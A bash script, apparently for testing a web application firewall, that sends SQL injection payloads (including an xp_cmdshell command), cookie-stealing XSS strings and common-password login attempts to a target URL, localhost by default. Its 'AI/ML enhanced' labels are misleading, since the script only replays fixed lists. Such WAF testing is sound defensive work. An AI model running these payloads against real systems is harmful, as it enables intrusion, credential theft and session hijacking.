#!/bin/bash

# AI/ML Enhanced Attack Simulation Script
# Usage: ./enhanced-attacks.sh <target-url>

TARGET_URL=${1:-"http://localhost:3000"}

echo "🤖 AI/ML Enhanced Attack Simulation"
echo "Target: $TARGET_URL"
echo "=================================="

# Test 1: Advanced SQL Injection with Pattern Learning
echo -e "\n1. Testing AI-enhanced SQL injection patterns..."
PAYLOADS=(
    "' OR '1'='1"
    "' UNION SELECT NULL,NULL--"
    "' AND 1=CONVERT(int,(SELECT @@version))--"
    "' AND 1=db_name()--"
    "'; EXEC xp_cmdshell('net user')--"
)

for payload in "${PAYLOADS[@]}"; do
    echo "Testing payload: $payload"
    curl -s "$TARGET_URL/search?q=$payload" | jq '.' 2>/dev/null || curl -s "$TARGET_URL/search?q=$payload"
    sleep 1  # Rate limiting to avoid overwhelming the target
done

# Test 2: Machine Learning Based XSS Detection
echo -e "\n2. Testing ML-based XSS patterns..."
XSS_PAYLOADS=(
    "<script>alert(document.cookie)</script>"
    "<img src=x onerror=alert('XSS')>"
    "<svg/onload=alert('XSS')>"
    "javascript:alert('XSS')"
    "<body onload=alert('XSS')>"
)

for payload in "${XSS_PAYLOADS[@]}"; do
    echo "Testing payload: $payload"
    curl -s "$TARGET_URL/comment" -d "content=$payload" | jq '.' 2>/dev/null
    sleep 1
done

# Test 3: Adaptive Brute Force
echo -e "\n3. Testing adaptive brute force patterns..."
COMMON_PASSWORDS=(
    "admin123"
    "password123"
    "qwerty"
    "letmein"
    "welcome1"
)

for pass in "${COMMON_PASSWORDS[@]}"; do
    echo "Testing credential: admin:$pass"
    curl -s -X POST "$TARGET_URL/login" -d "user=admin&pass=$pass" | jq '.' 2>/dev/null
    sleep 1
done

echo -e "\n=================================="
echo "AI/ML Enhanced tests completed!"
echo "Check the WAF dashboard for detection patterns and blocked requests."
